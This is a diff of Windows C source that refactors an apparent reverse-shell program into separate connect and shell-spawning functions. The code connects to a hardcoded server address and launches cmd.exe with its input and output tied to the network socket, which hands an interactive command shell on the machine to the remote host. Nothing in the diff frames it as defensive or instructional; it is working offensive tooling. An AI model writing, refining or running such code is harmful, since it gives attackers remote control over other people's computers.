@@ -19,7 +19,7 @@
 #define DEFAULT_SERVER "192.168.72.157"
 
 
-int confAddrInfo(struct addrinfo *result) {
+int confAddrInfo(struct addrinfo **result) {
 	struct addrinfo hints;
 	int iResult;
 
@@ -36,6 +36,71 @@ int confAddrInfo(struct addrinfo *result) {
 		WSACleanup();
 		return 1;
 	}
+}
+
+int bindSocket(SOCKET *ConnectSocket, struct addrinfo *result) {
+	int iResult;
+
+	// Create a SOCKET for connecting to server
+	*ConnectSocket = WSASocket(result->ai_family, result->ai_socktype,
+		result->ai_protocol, NULL, 0, 0);
+	if (*ConnectSocket == INVALID_SOCKET) {
+		printf("socket failed with error: %ld\n", WSAGetLastError());
+		WSACleanup();
+		return 1;
+	}
+
+	// Connect to server.
+	printf("Connecting to server\n");
+	iResult = WSAConnect(*ConnectSocket, result->ai_addr, (int)result->ai_addrlen, NULL, NULL, NULL, NULL);
+	if (iResult == SOCKET_ERROR) {
+		closesocket(*ConnectSocket);
+		*ConnectSocket = INVALID_SOCKET;
+	}
+}
+
+int spawnShell(SOCKET *ConnectSocket) {
+	// could be used to send additional information
+	// Send an initial buffer
+	//iResult = send(*ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
+	//if (iResult == SOCKET_ERROR) {
+	//	printf("send failed with error: %d\n", WSAGetLastError());
+	//	closesocket(*ConnectSocket);
+	//	WSACleanup();
+	//	continue;
+	//}
+	//printf("Bytes Sent: %ld\n", iResult);
+
+	printf("Spawning process\n");
+	char Process[] = "C:\\Windows\\System32\\cmd.exe";
+	STARTUPINFO sinfo;
+	PROCESS_INFORMATION pinfo;
+	memset(&sinfo, 0, sizeof(sinfo));
+	sinfo.cb = sizeof(sinfo);
+	sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+	sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) *ConnectSocket;
+	if (!CreateProcessA(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo)) {
+		printf("CreateProcess failed (%d).\n", GetLastError());
+	}
+
+	printf("Process exited\n");
+	WaitForSingleObject(pinfo.hProcess, INFINITE);
+	CloseHandle(pinfo.hProcess);
+	CloseHandle(pinfo.hThread);
+	printf("Process exited\n");
+
+	// Receive until the peer closes the connection
+	//do {
+
+	//	iResult = recv(*ConnectSocket, recvbuf, recvbuflen, 0);
+	//	if (iResult > 0)
+	//		printf("Bytes received: %d\n", iResult);
+	//	else if (iResult == 0)
+	//		printf("Connection closed\n");
+	//	else
+	//		printf("recv failed with error: %d\n", WSAGetLastError());
+
+	//} while (iResult > 0);
 
 }
 
@@ -63,22 +128,7 @@ int __cdecl main(int argc, char** argv)
 			continue;
 		}
 
-		// Create a SOCKET for connecting to server
-		ConnectSocket = WSASocket(result->ai_family, result->ai_socktype,
-			result->ai_protocol, NULL, 0, 0);
-		if (ConnectSocket == INVALID_SOCKET) {
-			printf("socket failed with error: %ld\n", WSAGetLastError());
-			WSACleanup();
-			continue;
-		}
-
-		// Connect to server.
-		printf("Connecting to server\n");
-		iResult = WSAConnect(ConnectSocket, result->ai_addr, (int)result->ai_addrlen, NULL, NULL, NULL, NULL);
-		if (iResult == SOCKET_ERROR) {
-			closesocket(ConnectSocket);
-			ConnectSocket = INVALID_SOCKET;
-		}
+		bindSocket(&ConnectSocket, result);
 
 		freeaddrinfo(result);
 		if (ConnectSocket == INVALID_SOCKET) {
@@ -87,48 +137,7 @@ int __cdecl main(int argc, char** argv)
 			continue;
 		}
 
-		// could be used to send additional information
-		// Send an initial buffer
-		//iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
-		//if (iResult == SOCKET_ERROR) {
-		//	printf("send failed with error: %d\n", WSAGetLastError());
-		//	closesocket(ConnectSocket);
-		//	WSACleanup();
-		//	continue;
-		//}
-		//printf("Bytes Sent: %ld\n", iResult);
-
-		// WinAPI > pipeing to cmd.exe
-		printf("Spawning process\n");
-		char Process[] = "C:\\Windows\\System32\\cmd.exe";
-		STARTUPINFO sinfo;
-		PROCESS_INFORMATION pinfo;
-		memset(&sinfo, 0, sizeof(sinfo));
-		sinfo.cb = sizeof(sinfo);
-		sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
-		sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) ConnectSocket;
-		if (!CreateProcessA(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo)) {
-			printf("CreateProcess failed (%d).\n", GetLastError());
-		}
-
-		printf("Process exited\n");
-		WaitForSingleObject(pinfo.hProcess, INFINITE);
-		CloseHandle(pinfo.hProcess);
-		CloseHandle(pinfo.hThread);
-		printf("Process exited\n");
-
-		// Receive until the peer closes the connection
-		//do {
-
-		//	iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
-		//	if (iResult > 0)
-		//		printf("Bytes received: %d\n", iResult);
-		//	else if (iResult == 0)
-		//		printf("Connection closed\n");
-		//	else
-		//		printf("recv failed with error: %d\n", WSAGetLastError());
-
-		//} while (iResult > 0);
+		spawnShell(&ConnectSocket);
 
 		// shutdown the connection since no more data will be sent
 		iResult = shutdown(ConnectSocket, SD_SEND);
